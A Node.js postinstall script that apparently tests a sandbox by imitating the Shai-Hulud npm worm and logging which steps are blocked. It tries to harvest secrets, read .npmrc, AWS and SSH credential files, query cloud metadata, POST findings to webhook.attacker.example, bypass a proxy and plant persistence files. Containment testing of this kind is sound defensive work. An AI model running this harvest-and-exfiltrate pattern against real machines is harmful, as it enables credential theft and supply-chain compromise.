// A harmless imitation of a token-stealing postinstall (the September 2025 Shai-Hulud worm). It tries each step the
// worm tried and writes what happened to postinstall-report.json. It never sends anything anywhere real: every host is
// a reserved .example name, and it does not publish packages or copy itself. Outcomes: blocked, nothing-there,
// contained (worked, but only inside this task's own copy) or got-through (a failure of the defence).
const fs = require('node:fs');
const net = require('node:net');
const path = require('node:path');

const report = [];
const add = (step, what, outcome, detail) => report.push({ step, what, outcome, detail: String(detail).slice(0, 200) });
const code = (e) => e.code ?? e.cause?.code ?? e.cause?.message ?? e.message;
const tryRead = (f) => { try { return { text: fs.readFileSync(f, 'utf8') }; } catch (e) { return { err: code(e) }; } };
const ask = (url, opts) => fetch(url, { ...opts, signal: AbortSignal.timeout(5000) }).then((r) => (r.ok ? 'reached' : `refused HTTP ${r.status}`), (e) => `failed ${code(e)}`);
const reached = (s) => s === 'reached';

async function main() {
  // 1. Secrets in the environment: the worm harvested tokens (GitHub, npm, cloud keys) from process.env.
  // Match real credential names (_TOKEN, _SECRET, _API_KEY, AWS_*), never npm's own npm_config_*/npm_package_* lifecycle vars.
  const named = Object.keys(process.env).filter((k) => /^AWS_|_TOKEN$|_SECRET$|_PASSWORD$|_API_KEY$/i.test(k));
  add('env', 'read secrets from the environment', named.length ? 'got-through' : 'nothing-there', named.length ? named.join(',') : 'no token-like variable');

  // 2. Dotfiles that hold credentials, in this user's home and in the machine's real users' homes.
  const home = process.env.HOME ?? '';
  const homes = ['/root', ...(fs.existsSync('/home') ? (() => { try { return fs.readdirSync('/home').map((u) => path.join('/home', u)); } catch { return []; } })() : [])];
  const files = [path.join(home, '.npmrc'), path.join(home, '.aws/credentials'), path.join(home, '.ssh/id_ed25519'), ...homes.flatMap((h) => [`${h}/.npmrc`, `${h}/.aws/credentials`, `${h}/.ssh/id_ed25519`, `${h}/.config/gh/hosts.yml`])];
  const got = files.map((f) => ({ f, ...tryRead(f) }));
  const read = got.filter((x) => x.text !== undefined);
  add('dotfiles', `read ${got.length} credential files (.npmrc, .aws, .ssh, gh)`, read.length ? 'got-through' : 'blocked', read.length ? read.map((x) => x.f).join(',') : [...new Set(got.map((x) => x.err))].join('/'));

  // 3. The box's vault.
  const v = tryRead('/etc/box/vault.env');
  add('vault', 'read /etc/box/vault.env', v.text !== undefined ? 'got-through' : 'blocked', v.err ?? 'read it');

  // 4. Cloud metadata, where the worm went for cloud credentials.
  const meta = await ask('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
  add('cloud-metadata', 'ask the cloud metadata address for credentials', reached(meta) ? 'got-through' : 'blocked', meta);

  // 5. Send what it found to the attacker's collector (the worm used a webhook), then go around the proxy.
  const sent = await ask('https://webhook.attacker.example/collect', { method: 'POST', body: JSON.stringify({ env: named, files: read.map((x) => x.f) }) });
  add('exfil', 'POST the loot to webhook.attacker.example', reached(sent) ? 'got-through' : 'blocked', sent);
  const direct = await new Promise((resolve) => {
    const s = net.connect(443, '1.1.1.1', () => (s.destroy(), resolve('connected')));
    s.on('error', (e) => resolve(`failed ${e.code}`));
    s.setTimeout(4000, () => (s.destroy(), resolve('failed timeout')));
  });
  add('exfil-direct', 'open a raw connection to 1.1.1.1:443, skipping the proxy', direct === 'connected' ? 'got-through' : 'blocked', direct);

  // 6. Use a stolen npm token to publish to other packages (the worm's spread). Here: only try to reach the registry, with no token.
  const reg = await ask('https://registry.npmjs.org/-/whoami');
  add('spread', 'reach registry.npmjs.org to publish as the victim', reached(reg) ? 'got-through' : 'blocked', reg);

  // 7. Look for other tasks' files on the box.
  const boxes = (() => { try { return fs.readdirSync('/var/lib').filter((d) => d.startsWith('box')).map((d) => path.join('/var/lib', d)); } catch { return []; } })();
  const peers = boxes.map((b) => ({ b, ...(() => { try { return { list: fs.readdirSync(path.join(b, 'tasks')) }; } catch (e) { return { err: code(e) }; } })() }));
  const listed = peers.filter((p) => p.list);
  add('other-tasks', 'list other tasks under /var/lib/box*/tasks', listed.length ? 'got-through' : 'blocked', listed.length ? listed.map((p) => p.b).join(',') : [...new Set(peers.map((p) => p.err))].join('/') || 'no such directory');

  // 8. Persistence: a CI workflow in the project (the worm added one) and a login script in the real /etc.
  const proj = process.env.INIT_CWD ?? process.cwd();
  const wf = path.join(proj, '.github/workflows/shai-hulud-imitation.yml');
  try {
    fs.mkdirSync(path.dirname(wf), { recursive: true });
    fs.writeFileSync(wf, '# harmless imitation: a real worm puts a secret-exfiltrating workflow here\n');
    add('persist-workflow', 'write a workflow into the project', 'contained', 'written in this task\'s own copy; undo removes it');
  } catch (e) { add('persist-workflow', 'write a workflow into the project', 'blocked', code(e)); }
  try {
    fs.writeFileSync('/etc/profile.d/imitation.sh', 'echo imitation\n');
    add('persist-system', 'write a login script into /etc/profile.d', 'got-through', 'written');
  } catch (e) { add('persist-system', 'write a login script into /etc/profile.d', 'blocked', code(e)); }

  fs.writeFileSync(path.join(proj, 'postinstall-report.json'), JSON.stringify(report, null, 1));
}

main().catch((e) => { add('postinstall', 'crashed', 'blocked', e.message); fs.writeFileSync(path.join(process.env.INIT_CWD ?? '.', 'postinstall-report.json'), JSON.stringify(report)); });
